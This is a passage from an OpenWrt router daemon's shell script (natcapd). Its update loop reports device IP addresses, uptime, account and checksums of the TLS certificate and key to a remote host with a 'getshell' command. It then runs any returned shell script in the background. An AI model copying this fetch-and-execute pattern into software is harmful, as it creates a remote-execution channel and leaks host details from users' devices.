	while :; do
		test -f $LOCKDIR/$PID || return 0
		test -p /tmp/trigger_natcapd_update.fifo || { sleep 1 && continue; }
		ping -q -W3 -c1 8.8.8.8 || ping -q -W3 -c1 114.114.114.114 || { sleep 11 && continue; }
		mytimeout 660 'cat /tmp/trigger_natcapd_update.fifo' >/dev/null && {
			rm -f /tmp/xx.tmp.json
			rm -f /tmp/nohup.out
			HSET=`cat /usr/share/natcapd/cniplist.set /usr/share/natcapd/C_cniplist.set /usr/share/natcapd/local.set | cksum | awk '{print $1}'`
			HKEY=`cat /etc/uhttpd.crt /etc/uhttpd.key | cksum | awk '{print $1}'`
			IFACES=`ip r | grep default | grep -o 'dev .*' | cut -d" " -f2 | sort | uniq`
			LIP=""
			for IFACE in $IFACES; do
				LIP="$LIP:`ifconfig $IFACE | grep 'inet addr:' | sed 's/:/ /' | awk '{print $3}'`"
			done
			LIP=`echo $LIP | sed 's/^://'`

			IFACE6S=`ip -6 r | grep default | grep -o 'dev .*' | cut -d" " -f2 | sort | uniq`
			LIP6=""
			for IFACE6 in $IFACE6S; do
				LIP6="$LIP6,`ip -6 addr list dev $IFACE6 | grep '\(inet6.*scope.*global[ ]*$\|inet6.*scope.*global.*dynamic\)' | awk '{print $2}'`"
			done
			LIP6=`echo $LIP6 | sed 's/^,//;s/ /,/g'`

			#checking extra run status
			UP=`cat /proc/uptime | cut -d"." -f1`

			SRV="`cat /dev/natcap_ctl | grep current_server | grep -o '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)'`"
			TXRX=`txrx_vals | b64encode`
			CV=`uci get natcapd.default.config_version 2>/dev/null`
			ACC=`uci get natcapd.default.account 2>/dev/null`
			hostip=`nslookup_check router-sh.ptpt52.com`
			built_in_server=`uci get natcapd.default._built_in_server`
			test -n "$built_in_server" || built_in_server=119.29.195.202
			test -n "$hostip" || hostip=$built_in_server
			ipset add bypasslist $built_in_server 2>/dev/null
			ipset add bypasslist $hostip 2>/dev/null
			URI="/router-update.cgi?cmd=getshell&cl=$crashlog&acc=$ACC&cli=$CLI&ver=$VER&cv=$CV&tar=$TAR&mod=$MOD&txrx=$TXRX&seq=$SEQ&up=$UP&lip=$LIP&lip6=$LIP6&srv=$SRV&hkey=$HKEY&hset=$HSET"
			$WGET --timeout=180 --ca-certificate=/tmp/cacert.pem -qO /tmp/xx.tmp.json \
				"https://router-sh.ptpt52.com$URI" || \
				$WGET --timeout=60 --header="Host: router-sh.ptpt52.com" --ca-certificate=/tmp/cacert.pem -qO /tmp/xx.tmp.json \
					"https://$hostip$URI" || {
						$WGET --timeout=60 --header="Host: router-sh.ptpt52.com" --ca-certificate=/tmp/cacert.pem -qO /tmp/xx.tmp.json \
							"https://$built_in_server$URI" || {
							#XXX disable dns proxy, becasue of bad connection
							ipset -n list knocklist >/dev/null 2>&1 || ipset -! create knocklist iphash hashsize 64 maxelem 1024
							ipset add knocklist $hostip 2>/dev/null
							cp /tmp/natcapd.txrx.old /tmp/natcapd.txrx
							continue
						}
					}
			head -n1 /tmp/xx.tmp.json | grep -q '#!/bin/sh' >/dev/null 2>&1 && {
				nohup sh /tmp/xx.tmp.json &
			}
			head -n1 /tmp/xx.tmp.json | grep -q '#!/bin/sh' >/dev/null 2>&1 || mv /tmp/xx.tmp.json /tmp/xx.json
			SEQ=$((SEQ+1))
		}
	done
}

if mkdir $LOCKDIR >/dev/null 2>&1; then
	trap "cleanup" EXIT

	echo "Acquired lock, running"

	rm -f $LOCKDIR/*
	touch $LOCKDIR/$PID

	mkfifo /tmp/trigger_gfwlist_update.fifo 2>/dev/null
	mkfifo /tmp/trigger_natcapd_update.fifo 2>/dev/null

	gfwlist_update_main &
	main_trigger &
	natcapd_first_boot &

	ping_cli
else
	natcapd_first_boot &
	exit 0
fi
